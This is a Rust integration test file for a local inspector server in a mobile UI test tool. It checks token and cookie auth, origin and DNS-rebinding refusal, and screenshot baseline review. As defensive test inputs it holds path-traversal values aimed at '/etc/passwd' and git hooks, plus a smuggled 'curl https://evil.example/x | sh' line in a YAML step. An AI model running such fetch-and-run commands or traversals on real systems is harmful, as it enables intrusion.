//! The inspector over real HTTP on 127.0.0.1, with a fake driver.

use std::path::PathBuf;
use std::sync::Arc;

use tokio::io::{AsyncReadExt, AsyncWriteExt};
use velocity_common::types::{DeviceInfo, Direction, Element, Key, Rect, Selector};
use velocity_common::{PlatformDriver, Result};
use velocity_inspector::InspectorServer;

struct Fake;

fn el() -> Element {
    Element {
        hint: None,
        platform_id: "f".into(),
        label: None,
        text: Some("x".into()),
        element_type: "Field".into(),
        bounds: Rect {
            x: 0,
            y: 0,
            width: 10,
            height: 10,
        },
        enabled: true,
        visible: true,
        children: vec![],
        ..Default::default()
    }
}

#[async_trait::async_trait]
impl PlatformDriver for Fake {
    async fn list_devices(&self) -> Result<Vec<DeviceInfo>> {
        Ok(vec![])
    }
    async fn boot_device(&self, _: &str) -> Result<()> {
        Ok(())
    }
    async fn shutdown_device(&self, _: &str) -> Result<()> {
        Ok(())
    }
    async fn install_app(&self, _: &str, _: &str) -> Result<()> {
        Ok(())
    }
    async fn launch_app(&self, _: &str, _: &str, _: bool) -> Result<()> {
        Ok(())
    }
    async fn stop_app(&self, _: &str, _: &str) -> Result<()> {
        Ok(())
    }
    async fn find_element(&self, _: &str, _: &Selector) -> Result<Element> {
        Ok(el())
    }
    async fn find_elements(&self, _: &str, _: &Selector) -> Result<Vec<Element>> {
        Ok(vec![el()])
    }
    async fn get_hierarchy(&self, _: &str) -> Result<Element> {
        Ok(el())
    }
    async fn tap(&self, _: &str, _: &Element) -> Result<()> {
        Ok(())
    }
    async fn double_tap(&self, _: &str, _: &Element) -> Result<()> {
        Ok(())
    }
    async fn long_press(&self, _: &str, _: &Element, _: u64) -> Result<()> {
        Ok(())
    }
    async fn input_text(&self, _: &str, _: &Element, _: &str) -> Result<()> {
        Ok(())
    }
    async fn clear_text(&self, _: &str, _: &Element) -> Result<()> {
        Ok(())
    }
    async fn swipe(&self, _: &str, _: Direction) -> Result<()> {
        Ok(())
    }
    async fn swipe_coords(&self, _: &str, _: (i32, i32), _: (i32, i32)) -> Result<()> {
        Ok(())
    }
    async fn press_key(&self, _: &str, _: Key) -> Result<()> {
        Ok(())
    }
    async fn screenshot(&self, _: &str) -> Result<Vec<u8>> {
        Ok(vec![])
    }
    async fn screen_size(&self, _: &str) -> Result<(i32, i32)> {
        Ok((100, 100))
    }
    async fn get_element_text(&self, _: &str, _: &Element) -> Result<String> {
        Ok(String::new())
    }
    async fn is_element_visible(&self, _: &str, _: &Element) -> Result<bool> {
        Ok(true)
    }
}

struct Resp {
    code: u16,
    head: String,
    body: String,
}

async fn send(port: u16, method: &str, path: &str, headers: &[(&str, &str)], body: &str) -> Resp {
    let mut s = tokio::net::TcpStream::connect(("127.0.0.1", port))
        .await
        .unwrap();
    let mut req = format!("{method} {path} HTTP/1.1\r\n");
    for (k, v) in headers {
        req.push_str(&format!("{k}: {v}\r\n"));
    }
    if !headers
        .iter()
        .any(|(k, _)| k.eq_ignore_ascii_case("content-type"))
    {
        req.push_str("Content-Type: application/json\r\n");
    }
    req.push_str(&format!(
        "Content-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    ));
    s.write_all(req.as_bytes()).await.unwrap();
    let mut buf = Vec::new();
    let _ = tokio::time::timeout(std::time::Duration::from_secs(10), s.read_to_end(&mut buf)).await;
    let txt = String::from_utf8_lossy(&buf).to_string();
    let (head, body) = txt.split_once("\r\n\r\n").unwrap_or((&txt, ""));
    Resp {
        code: head
            .split_whitespace()
            .nth(1)
            .and_then(|c| c.parse().ok())
            .unwrap_or(0),
        head: head.to_ascii_lowercase(),
        body: body.to_string(),
    }
}

fn tmp_dir(tag: &str) -> PathBuf {
    let d = std::env::temp_dir().join(format!(
        "vel-insp-{tag}-{}-{}",
        std::process::id(),
        velocity_inspector::security::new_token()
    ));
    std::fs::create_dir_all(&d).unwrap();
    d
}

/// Start a server on 127.0.0.1:0; returns (port, token, flows dir).
async fn start() -> (u16, String, PathBuf, tokio::task::JoinHandle<()>) {
    let flows = tmp_dir("flows");
    let listener = InspectorServer::bind(0).await.unwrap();
    assert!(listener.local_addr().unwrap().ip().is_loopback());
    let port = listener.local_addr().unwrap().port();
    let srv = InspectorServer::new(Arc::new(Fake), Some("dev".into()), None).with_flows_dir(&flows);
    let token = srv.token().to_string();
    assert!(srv
        .url(listener.local_addr().unwrap())
        .ends_with(&format!(":{port}/?token={token}")));
    let task = tokio::spawn(async move {
        let _ = srv.start_with_listener(listener).await;
    });
    (port, token, flows, task)
}

fn save_body(path: &str, step: &str) -> String {
    serde_json::json!({"name": "x", "app_id": "com.x", "path": path, "steps": [step]}).to_string()
}

#[tokio::test]
async fn cross_origin_and_tokenless_requests_are_refused() {
    let (port, token, flows, task) = start().await;
    let host = format!("127.0.0.1:{port}");
    let step = "- tap: { text: \"a\" }";

    // No token at all.
    let r = send(port, "GET", "/api/devices", &[("Host", &host)], "").await;
    assert_eq!(r.code, 401, "{}", r.body);

    // A web page the developer visits: has neither token nor our origin.
    let r = send(
        port,
        "POST",
        "/api/flow/save",
        &[("Host", &host), ("Origin", "https://evil.example")],
        &save_body("a.yaml", step),
    )
    .await;
    assert_eq!(r.code, 403, "{}", r.body);
    assert!(
        !r.head.contains("access-control-allow-origin"),
        "{}",
        r.head
    );

    // Even with the token, a foreign Origin or Host (DNS rebinding) fails.
    let r = send(
        port,
        "POST",
        "/api/flow/save",
        &[
            ("Host", &host),
            ("Origin", "https://evil.example"),
            ("X-Velocity-Token", &token),
        ],
        &save_body("a.yaml", step),
    )
    .await;
    assert_eq!(r.code, 403);
    let r = send(
        port,
        "GET",
        "/api/devices",
        &[("Host", "evil.example"), ("X-Velocity-Token", &token)],
        "",
    )
    .await;
    assert_eq!(r.code, 403);

    // The WebSocket upgrade is guarded too.
    let r = send(
        port,
        "GET",
        "/api/ws/dev",
        &[
            ("Host", &host),
            ("Origin", "https://evil.example"),
            ("Upgrade", "websocket"),
            ("Sec-WebSocket-Version", "13"),
            ("Sec-WebSocket-Key", "dGhlIHNhbXBsZSBub25jZQ=="),
        ],
        "",
    )
    .await;
    assert_eq!(r.code, 403);

    assert!(!flows.join("a.yaml").exists());
    task.abort();
    let _ = std::fs::remove_dir_all(&flows);
}

#[tokio::test]
async fn the_ui_url_sets_a_cookie_that_authorises_the_api() {
    let (port, token, flows, task) = start().await;
    let host = format!("localhost:{port}");
    let r = send(
        port,
        "GET",
        &format!("/?token={token}"),
        &[("Host", &host)],
        "",
    )
    .await;
    let cookie = r
        .head
        .lines()
        .find_map(|l| l.strip_prefix("set-cookie: "))
        .and_then(|c| c.split(';').next())
        .map(str::to_string)
        .expect("cookie set");
    assert!(r.head.contains("samesite=strict") && r.head.contains("httponly"));
    // The token leaves the address bar.
    assert_eq!(r.code, 302);
    assert!(r.head.lines().any(|l| l == "location: /"), "{}", r.head);
    assert!(r.head.contains("referrer-policy: no-referrer"));
    // Header names are lowercased above; the value (the token) is hex.
    let r = send(
        port,
        "GET",
        "/api/devices",
        &[("Host", &host), ("Cookie", &cookie)],
        "",
    )
    .await;
    assert_eq!(r.code, 200, "{}", r.body);
    assert!(r.head.contains("cache-control: no-store"));
    assert!(r.head.contains("cross-origin-resource-policy: same-origin"));

    // A wrong token sets nothing.
    let r = send(port, "GET", "/?token=nope", &[("Host", &host)], "").await;
    assert!(!r.head.contains("set-cookie"));
    task.abort();
    let _ = std::fs::remove_dir_all(&flows);
}

#[tokio::test]
async fn save_only_creates_new_yaml_files_under_the_flows_dir() {
    let (port, token, flows, task) = start().await;
    let host = format!("127.0.0.1:{port}");
    let origin = format!("http://{host}");
    let h = [
        ("Host", host.as_str()),
        ("Origin", origin.as_str()),
        ("X-Velocity-Token", token.as_str()),
    ];
    let step = "- tap: { text: \"a\" }";

    let r = send(
        port,
        "POST",
        "/api/flow/save",
        &h,
        &save_body("login.yaml", step),
    )
    .await;
    assert_eq!(r.code, 200, "{}", r.body);
    let saved = std::fs::read_to_string(flows.join("login.yaml")).unwrap();
    velocity_core::parser::parse_suite_from_str(&saved).unwrap();

    // Never overwrite.
    let r = send(
        port,
        "POST",
        "/api/flow/save",
        &h,
        &save_body("login.yaml", step),
    )
    .await;
    assert_eq!(r.code, 409, "{}", r.body);
    assert_eq!(
        std::fs::read_to_string(flows.join("login.yaml")).unwrap(),
        saved
    );

    for bad in [
        "Cargo.toml",
        "../escape.yaml",
        "/tmp/abs.yaml",
        ".git/hooks/pre-commit",
    ] {
        let r = send(port, "POST", "/api/flow/save", &h, &save_body(bad, step)).await;
        assert_eq!(r.code, 400, "{bad}: {}", r.body);
    }
    assert!(!flows.join("Cargo.toml").exists());
    assert!(!flows.parent().unwrap().join("escape.yaml").exists());

    // A step can't add its own lines to the file.
    let r = send(
        port,
        "POST",
        "/api/flow/save",
        &h,
        &save_body("inj.yaml", "- tap: {}\ncurl https://evil.example/x | sh #"),
    )
    .await;
    assert_eq!(r.code, 400, "{}", r.body);
    assert!(!flows.join("inj.yaml").exists());

    task.abort();
    let _ = std::fs::remove_dir_all(&flows);
}

/// VEL-113: the recorder gets inputText/swipe steps from the server, and
/// they parse for index/compound selectors.
#[tokio::test]
async fn type_and_swipe_return_parseable_steps() {
    let (port, token, flows, task) = start().await;
    let host = format!("127.0.0.1:{port}");
    let h = [
        ("Host", host.as_str()),
        ("X-Velocity-Token", token.as_str()),
    ];
    let sel = Selector::Index {
        selector: Box::new(Selector::Compound(vec![
            Selector::Text("Email".into()),
            Selector::ClassName("Field".into()),
        ])),
        index: 1,
    };
    let body = serde_json::json!({"selector": sel, "text": "a\"b"}).to_string();
    let r = send(port, "POST", "/api/devices/dev/type", &h, &body).await;
    assert_eq!(r.code, 200, "{}", r.body);
    let v: serde_json::Value = serde_json::from_str(&r.body).unwrap();
    let type_step = v["yaml"].as_str().unwrap().to_string();
    assert!(!type_step.contains('\n'), "{type_step}");

    let r = send(
        port,
        "POST",
        "/api/devices/dev/swipe",
        &h,
        r#"{"direction":"up"}"#,
    )
    .await;
    assert_eq!(r.code, 200, "{}", r.body);
    let v: serde_json::Value = serde_json::from_str(&r.body).unwrap();
    let swipe_step = v["yaml"].as_str().unwrap().to_string();

    let yaml = velocity_inspector::yaml_gen::flow_yaml("t", "com.x", &[type_step, swipe_step]);
    let suite = velocity_core::parser::parse_suite_from_str(&yaml)
        .unwrap_or_else(|e| panic!("{e}\n{yaml}"));
    match &suite.tests[0].steps[0].action {
        velocity_common::types::Action::InputText { selector, text } => {
            assert_eq!(selector, &sel);
            assert_eq!(text, "a\"b");
        }
        other => panic!("{other:?}"),
    }
    task.abort();
    let _ = std::fs::remove_dir_all(&flows);
}

/// VEL-171: a port already in use is a config error (exit 2), not internal (exit 5).
#[tokio::test]
async fn a_port_in_use_is_a_config_error() {
    let held = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let port = held.local_addr().unwrap().port();
    let err = velocity_inspector::InspectorServer::bind_on(
        std::net::IpAddr::V4(std::net::Ipv4Addr::LOCALHOST),
        port,
    )
    .await
    .unwrap_err();
    let ve = err
        .downcast_ref::<velocity_common::VelocityError>()
        .unwrap_or_else(|| panic!("not a VelocityError: {err:?}"));
    assert_eq!(ve.exit_code(), 2, "{ve:?}");
}

/// VEL-256/257: an unknown API route is a 404 (not the UI's HTML), and the
/// headless stubs answer 501 instead of claiming success.
#[tokio::test]
async fn unknown_api_routes_404_and_headless_stubs_501() {
    let (port, token, flows, task) = start().await;
    let host = format!("127.0.0.1:{port}");
    let origin = format!("http://{host}");
    let h = [
        ("Host", host.as_str()),
        ("Origin", origin.as_str()),
        ("X-Velocity-Token", token.as_str()),
    ];
    let r = send(port, "GET", "/api/nope", &h, "").await;
    assert_eq!(r.code, 404, "{}", r.body);
    assert!(!r.body.contains("<html"), "{}", r.body);
    for (method, path) in [
        ("GET", "/api/headless/status"),
        ("GET", "/api/headless/render-tree"),
        ("POST", "/api/headless/re-render"),
    ] {
        let r = send(port, method, path, &h, "{}").await;
        assert_eq!(r.code, 501, "{path}: {}", r.body);
    }
    task.abort();
    let _ = std::fs::remove_dir_all(&flows);
}

/// 1x1 RGBA PNGs: black and white.
const BLACK: [u8; 70] = [
    137, 80, 78, 71, 13, 10, 26, 10, 0, 0, 0, 13, 73, 72, 68, 82, 0, 0, 0, 1, 0, 0, 0, 1, 8, 6, 0,
    0, 0, 31, 21, 196, 137, 0, 0, 0, 13, 73, 68, 65, 84, 120, 156, 99, 96, 96, 96, 248, 15, 0, 1,
    4, 1, 0, 95, 229, 195, 75, 0, 0, 0, 0, 73, 69, 78, 68, 174, 66, 96, 130,
];
const WHITE: [u8; 68] = [
    137, 80, 78, 71, 13, 10, 26, 10, 0, 0, 0, 13, 73, 72, 68, 82, 0, 0, 0, 1, 0, 0, 0, 1, 8, 6, 0,
    0, 0, 31, 21, 196, 137, 0, 0, 0, 11, 73, 68, 65, 84, 120, 156, 99, 248, 15, 4, 0, 9, 251, 3,
    253, 251, 94, 107, 43, 0, 0, 0, 0, 73, 69, 78, 68, 174, 66, 96, 130,
];

/// A results dir with one failed comparison per name, as the executor
/// leaves it; returns (results dir, baseline path per name).
fn failed_shots(root: &std::path::Path, names: &[&str]) -> (PathBuf, Vec<PathBuf>) {
    let results = root.join("velocity-results");
    let diffs = results.join("diffs");
    std::fs::create_dir_all(&diffs).unwrap();
    let mut paths = vec![];
    for name in names {
        let baseline = root.join(format!("suite/velocity-baselines/ios/1x1/{name}.png"));
        std::fs::create_dir_all(baseline.parent().unwrap()).unwrap();
        std::fs::write(&baseline, BLACK).unwrap();
        std::fs::write(diffs.join(format!("{name}-expected.png")), BLACK).unwrap();
        std::fs::write(diffs.join(format!("{name}-actual.png")), WHITE).unwrap();
        std::fs::write(diffs.join(format!("{name}-diff.png")), WHITE).unwrap();
        velocity_core::baselines::record_failure(
            &diffs,
            &format!("{name}.png"),
            &velocity_core::baselines::ReviewRecord {
                name: name.to_string(),
                baseline: baseline.clone(),
                detail: "50.00% similar".into(),
                baseline_hash: None,
            },
        )
        .unwrap();
        paths.push(baseline);
    }
    (results, paths)
}

async fn start_review(results: &std::path::Path) -> (u16, String, tokio::task::JoinHandle<()>) {
    let listener = InspectorServer::bind(0).await.unwrap();
    let addr = listener.local_addr().unwrap();
    let srv = InspectorServer::review_only(results);
    let token = srv.token().to_string();
    assert!(srv
        .review_url(addr)
        .ends_with(&format!(":{}/review?token={token}", addr.port())));
    let task = tokio::spawn(async move {
        let _ = srv.start_with_listener(listener).await;
    });
    (addr.port(), token, task)
}

/// U1: the review page lists failed screenshots with their images; Accept
/// writes the actual frame over the baseline, Reject leaves it; all of it
/// behind the session token.
#[tokio::test]
async fn the_review_page_lists_accepts_and_rejects_failed_screenshots() {
    let root = tmp_dir("review");
    let (results, baselines) = failed_shots(&root, &["home", "cart"]);
    let (port, token, task) = start_review(&results).await;
    let host = format!("localhost:{port}");
    let origin = format!("http://{host}");

    // Without the token: nothing, not even the page.
    for path in [
        "/review",
        "/api/baselines",
        "/api/baselines/image?id=diffs%2Fhome&kind=actual",
    ] {
        let r = send(port, "GET", path, &[("Host", &host)], "").await;
        assert_eq!(r.code, 401, "{path}: {}", r.body);
    }
    let r = send(
        port,
        "POST",
        "/api/baselines/accept",
        &[
            ("Host", &host),
            ("Content-Type", "application/x-www-form-urlencoded"),
        ],
        "id=diffs%2Fhome",
    )
    .await;
    assert_eq!(r.code, 401);
    // A foreign page with the cookie can't post the form either.
    let r = send(
        port,
        "GET",
        &format!("/review?token={token}"),
        &[("Host", &host)],
        "",
    )
    .await;
    assert_eq!(r.code, 302);
    assert!(
        r.head.lines().any(|l| l == "location: /review"),
        "{}",
        r.head
    );
    let cookie = r
        .head
        .lines()
        .find_map(|l| l.strip_prefix("set-cookie: "))
        .and_then(|c| c.split(';').next())
        .map(str::to_string)
        .expect("cookie set");
    let r = send(
        port,
        "POST",
        "/api/baselines/accept",
        &[
            ("Host", &host),
            ("Origin", "https://evil.example"),
            ("Cookie", &cookie),
            ("Content-Type", "application/x-www-form-urlencoded"),
        ],
        "id=diffs%2Fhome",
    )
    .await;
    assert_eq!(r.code, 403);
    assert_eq!(std::fs::read(&baselines[0]).unwrap(), BLACK);

    // The page, with the cookie.
    let r = send(
        port,
        "GET",
        "/review",
        &[("Host", &host), ("Cookie", &cookie)],
        "",
    )
    .await;
    assert_eq!(r.code, 200, "{}", r.body);
    assert!(r.head.contains("content-security-policy"), "{}", r.head);
    assert!(r.body.contains("2 pending"), "{}", r.body);
    for want in [
        "<h2>home</h2>",
        "<h2>cart</h2>",
        "/api/baselines/image?id=diffs%2Fhome&amp;kind=expected",
        "/api/baselines/image?id=diffs%2Fhome&amp;kind=actual",
        "/api/baselines/image?id=diffs%2Fhome&amp;kind=diff",
        "action=\"/api/baselines/accept\"",
        "action=\"/api/baselines/reject\"",
        "50.00% similar",
    ] {
        assert!(r.body.contains(want), "{want} missing: {}", r.body);
    }
    let r = send(
        port,
        "GET",
        "/api/baselines/image?id=diffs%2Fhome&kind=actual",
        &[("Host", &host), ("Cookie", &cookie)],
        "",
    )
    .await;
    assert_eq!(r.code, 200);
    assert!(r.head.contains("content-type: image/png"), "{}", r.head);
    // Ids are looked up, never used as paths.
    let r = send(
        port,
        "GET",
        "/api/baselines/image?id=..%2F..%2Fetc%2Fpasswd&kind=actual",
        &[("Host", &host), ("Cookie", &cookie)],
        "",
    )
    .await;
    assert_eq!(r.code, 404);

    // Accept from the page's form: the baseline becomes the actual frame.
    let r = send(
        port,
        "POST",
        "/api/baselines/accept",
        &[
            ("Host", &host),
            ("Origin", &origin),
            ("Cookie", &cookie),
            ("Content-Type", "application/x-www-form-urlencoded"),
        ],
        "id=diffs%2Fhome",
    )
    .await;
    assert_eq!(r.code, 303, "{}", r.body);
    assert!(
        r.head
            .lines()
            .any(|l| l == "location: /review?accepted=home"),
        "{}",
        r.head
    );
    assert_eq!(std::fs::read(&baselines[0]).unwrap(), WHITE);

    // Reject over JSON (an API client): the baseline stays.
    let r = send(
        port,
        "POST",
        "/api/baselines/reject",
        &[("Host", &host), ("X-Velocity-Token", &token)],
        r#"{"id":"diffs/cart"}"#,
    )
    .await;
    assert_eq!(r.code, 200, "{}", r.body);
    assert!(r.body.contains("\"rejected\":\"cart\""), "{}", r.body);
    assert_eq!(std::fs::read(&baselines[1]).unwrap(), BLACK);

    // Both are done; accepting again is a 404.
    let r = send(
        port,
        "GET",
        "/api/baselines",
        &[("Host", &host), ("X-Velocity-Token", &token)],
        "",
    )
    .await;
    assert_eq!(r.body.trim(), "[]");
    let r = send(
        port,
        "POST",
        "/api/baselines/accept",
        &[("Host", &host), ("X-Velocity-Token", &token)],
        r#"{"id":"diffs/home"}"#,
    )
    .await;
    assert_eq!(r.code, 404);
    let r = send(
        port,
        "GET",
        "/review",
        &[("Host", &host), ("Cookie", &cookie)],
        "",
    )
    .await;
    assert!(
        r.body.contains("No failed screenshot comparisons"),
        "{}",
        r.body
    );

    // The review-only inspector has no device to drive.
    let r = send(
        port,
        "GET",
        "/api/devices",
        &[("Host", &host), ("X-Velocity-Token", &token)],
        "",
    )
    .await;
    assert_eq!(r.code, 200, "{}", r.body);
    task.abort();
    let _ = std::fs::remove_dir_all(&root);
}

/// fi56: the page's Accept writes into `--baselines-dir` (CI artifacts name
/// the runner's absolute path), and a baseline changed after the failure was
/// recorded is a 409, not overwritten with the old frame.
#[tokio::test]
async fn review_accept_uses_the_baselines_dir_and_skips_stale_records() {
    let root = tmp_dir("review-ci");
    let (results, baselines) = failed_shots(&root, &["home", "cart"]);
    let local = root.join("checkout/velocity-baselines");
    let listener = InspectorServer::bind(0).await.unwrap();
    let port = listener.local_addr().unwrap().port();
    let srv = InspectorServer::review_only(&results).with_baselines_dir(Some(local.clone()));
    let token = srv.token().to_string();
    let task = tokio::spawn(async move {
        let _ = srv.start_with_listener(listener).await;
    });
    let host = format!("localhost:{port}");
    // The checkout holds what CI compared against (same content).
    std::fs::create_dir_all(local.join("ios/1x1")).unwrap();
    std::fs::write(local.join("ios/1x1/home.png"), BLACK).unwrap();
    let accept = |id: &'static str| {
        let (host, token) = (host.clone(), token.clone());
        async move {
            send(
                port,
                "POST",
                "/api/baselines/accept",
                &[("Host", &host), ("X-Velocity-Token", &token)],
                &format!(r#"{{"id":"{id}"}}"#),
            )
            .await
        }
    };
    let r = accept("diffs/home").await;
    assert_eq!(r.code, 200, "{}", r.body);
    assert_eq!(
        std::fs::read(local.join("ios/1x1/home.png")).unwrap(),
        WHITE
    );
    assert_eq!(
        std::fs::read(&baselines[0]).unwrap(),
        BLACK,
        "recorded path untouched"
    );

    // `cart` was re-recorded in the checkout after the failure (new
    // content: review-fi56 MAJOR-2 judges by content, not mtime).
    let there = local.join("ios/1x1/cart.png");
    let rerecorded = [&BLACK[..], b"re-recorded"].concat();
    std::fs::write(&there, &rerecorded).unwrap();
    std::fs::File::options()
        .write(true)
        .open(&there)
        .unwrap()
        .set_modified(std::time::SystemTime::now() + std::time::Duration::from_secs(60))
        .unwrap();
    let r = accept("diffs/cart").await;
    assert_eq!(r.code, 409, "{}", r.body);
    assert!(r.body.contains("changed after"), "{}", r.body);
    assert_eq!(std::fs::read(&there).unwrap(), rerecorded);
    task.abort();
    let _ = std::fs::remove_dir_all(&root);
}
